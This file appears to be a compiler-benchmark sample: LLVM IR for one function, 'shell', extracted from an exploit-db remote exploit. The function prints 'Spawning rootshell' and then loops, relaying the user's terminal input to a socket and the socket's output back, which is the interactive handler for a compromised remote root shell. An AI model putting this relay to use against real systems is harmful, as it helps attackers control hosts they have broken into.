; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19560.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/remote/extr_19560.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [25 x i8] c"%sSpawning rootshell:%s\0A\00", align 1
@C_RED = common dso_local global i8* null, align 8
@C_NORM = common dso_local global i8* null, align 8
@fd = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell() #0 {
  %1 = alloca [5120 x i8], align 16
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = load i8*, i8** @C_RED, align 8
  %5 = load i8*, i8** @C_NORM, align 8
  %6 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str, i64 0, i64 0), i8* %4, i8* %5)
  br label %7

7:                                                ; preds = %0, %44
  %8 = call i32 @FD_SET(i32 0, i32* %3)
  %9 = load i32, i32* @fd, align 4
  %10 = call i32 @FD_SET(i32 %9, i32* %3)
  %11 = load i32, i32* @fd, align 4
  %12 = add nsw i32 %11, 1
  %13 = call i32 @select(i32 %12, i32* %3, i32* null, i32* null, i32* null)
  %14 = call i64 @FD_ISSET(i32 0, i32* %3)
  %15 = icmp ne i64 %14, 0
  br i1 %15, label %16, label %28

16:                                               ; preds = %7
  %17 = getelementptr inbounds [5120 x i8], [5120 x i8]* %1, i64 0, i64 0
  %18 = call i32 @read(i32 0, i8* %17, i32 5120)
  store i32 %18, i32* %2, align 4
  %19 = load i32, i32* %2, align 4
  %20 = icmp sle i32 %19, 0
  br i1 %20, label %21, label %23

21:                                               ; preds = %16
  %22 = call i32 (...) @cleanup_and_exit()
  br label %23

23:                                               ; preds = %21, %16
  %24 = load i32, i32* @fd, align 4
  %25 = getelementptr inbounds [5120 x i8], [5120 x i8]* %1, i64 0, i64 0
  %26 = load i32, i32* %2, align 4
  %27 = call i32 @xwrite(i32 %24, i8* %25, i32 %26)
  br label %28

28:                                               ; preds = %23, %7
  %29 = load i32, i32* @fd, align 4
  %30 = call i64 @FD_ISSET(i32 %29, i32* %3)
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %44

32:                                               ; preds = %28
  %33 = load i32, i32* @fd, align 4
  %34 = getelementptr inbounds [5120 x i8], [5120 x i8]* %1, i64 0, i64 0
  %35 = call i32 @read(i32 %33, i8* %34, i32 5120)
  store i32 %35, i32* %2, align 4
  %36 = load i32, i32* %2, align 4
  %37 = icmp sle i32 %36, 0
  br i1 %37, label %38, label %40

38:                                               ; preds = %32
  %39 = call i32 (...) @cleanup_and_exit()
  br label %40

40:                                               ; preds = %38, %32
  %41 = getelementptr inbounds [5120 x i8], [5120 x i8]* %1, i64 0, i64 0
  %42 = load i32, i32* %2, align 4
  %43 = call i32 @xwrite(i32 1, i8* %41, i32 %42)
  br label %44

44:                                               ; preds = %40, %28
  br label %7
}

declare dso_local i32 @printf(i8*, i8*, i8*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @cleanup_and_exit(...) #1

declare dso_local i32 @xwrite(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
